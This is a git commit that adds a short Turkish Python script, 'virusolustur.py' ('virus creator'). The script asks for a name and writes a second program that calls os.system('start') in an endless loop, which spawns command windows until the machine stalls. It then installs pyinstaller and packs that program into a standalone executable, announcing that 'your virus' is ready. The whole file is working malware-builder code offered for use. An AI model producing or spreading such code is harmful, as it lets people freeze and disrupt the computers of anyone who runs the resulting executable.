c36374c405cbe7b65ca703bdca110b8660bd484b
Sexettin <72075007+sexettin78@users.noreply.github.com>
2021-07-11 01:58:53 +0300

    Add files via upload

---
+++ vrs/virusolustur.py
@@ -0,0 +1,16 @@
+import os
+
+ad = input("Virus adını giriniz > ")
+dosya = open(ad+".py","a")
+butun = (ad+".py")
+
+
+dosya.write('''import os
+while True:
+	os.system("start")
+''')
+os.system("pip install pyinstaller")
+os.system("pyinstaller --onefile "+butun)
+print("\n Virüsünüz oluşturuldu!")
+print("Virüsünüzün exe hali ve py hali bulunduğu dizinde!")
+
